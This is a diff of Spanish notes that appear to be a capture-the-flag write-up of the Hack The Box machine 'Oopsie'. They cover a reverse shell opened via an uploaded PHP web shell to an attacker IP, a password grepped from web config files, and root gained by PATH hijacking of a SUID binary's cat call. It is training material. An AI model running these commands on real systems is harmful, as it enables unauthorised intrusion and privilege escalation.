@@ -18,13 +18,22 @@
 	![[Oopsie11.png]]
 
 6)¿Cuál es el archivo que contiene la contraseña que se comparte con el usuario robert?
-	
+	db.php
+	Esto esta en la parte de escalada al usuario robert
 
+7)¿Qué ejecutable se ejecuta con la opción «-group bugtracker» para identificar todos los archivos propiedad del grupo bugtracker?
+	find
 
+8)Independientemente del usuario que inicie la ejecución del ejecutable bugtracker, ¿qué privilegios de usuario utilizará para ejecutarlo?
+	root
 
+9)¿Qué significa SUID?
+	set owner user id
 
-
-
+10)¿Cuál es el nombre del ejecutable al que se llama de forma insegura?
+	cat
+	![[Oopsie21.png]]
+Lo del cat lo pense de aca, que tira el error al no encontrar el archivo
 
 
 
@@ -56,7 +65,7 @@ Por el ttl cercano a 64 es una maquina linux
 No nos da ningun dato relevante
 
 ------
-# Vamos a interceptar con [[Caido]]
+# Vamos a interceptar con [[Caido (falta terminar)]]
 
 Aceptamos la primera peticion de la pagina, para que pase todo el trafico asi se genera un sitemap
 
@@ -117,16 +126,56 @@ Nos responde www-data asi que funciona correctamente
 # [[Reverse shell]]
 
 Con el archivo que subimos antes, vamos a ejecutar la revershell
-http://10.129.207.226/uploads/test.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'
+http://10.129.207.226/uploads/test.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'
 
 ![[Oopsie14.png]]
 Mientras estamos en escucha con [[nc -nlvp 443]]
 
-![[Oopsie15.png]]
+![[Oopsie16.png]]
 Ya estamos dentro de la maquina, ahora hacemos un [[Tratamiento de la TTY]]
 
 
+-----------
+# Escalada de al usuario robert
 
+Dentro de la carpeta /var/www/html/cdn-cgi ssamos el comando grep -riE "connect|.*connect|connect.*"   para buscar posibles contraseñas 
+
+
+![[Oopsie20.png]]
+
+Da como resultado ``M3g4C0rpUs3r!``
+![[Oopsie19.png]]
+
+------
+# Escala a root mediante binario del grupo bugtracker
+
+Vemos con [[id]] que estamos en el grupo bugtracker
+Usamos el  comando [[find]] ``find / -group bugtraker 2>/dev/null`` para buscar archivos que pueda ejecutar por estar en este grupo
+
+![[Oopsie23.png]]
+Y tenemos que podemos usar el binario */usr/bin/bugtracker*
+Al listar los permisos que tiene con [[ls]] `ls -l` vemos que es [[SUID]] y el usuario es root. 
+![[Oopsie25.png]]
+
+Al ejecutarlo me pide un id de bug, ponemos prueba y vamos que lo que esta haciendo el binario es un cat
+
+![[Oopsie24.png]]
+Entonces sacamos la conclusion de que estamos ejecutando el [[cat]] como si fueramos root
+
+--------
+# [[Path Hijacking]] al comando cat
+
+Agregamos en el PATH el directorio /tmp. y en ese directorio creamos el archivo cat con el contenido `/bin/bash` para que cuando lo ejecutemos nos abra una bash. Le damos permisos de ejecucion con [[chmod]] `chmod +x cat` . Y ejecutamos el binario, ponemos cualquier id de bug. Y ya se nos abre la bash con privilegios de root, y podemos catear la flag
+
+```shell
+export PATH=/tmp:$PATH          /Agrega al principio del PATH el directorio tmp
+echo "/bin/bash" > cat          /Crea el archivo cat, con el contenido /bin/bash
+chmod +x cat                    /Da permisos de ejecucion al comando cat
+/usr/bin/bugtracker             /Ejecuta el binario
+```
+
+![[Oopsie27.png]]
+![[Oopsie28.png]]
 
 -------
 # Notas
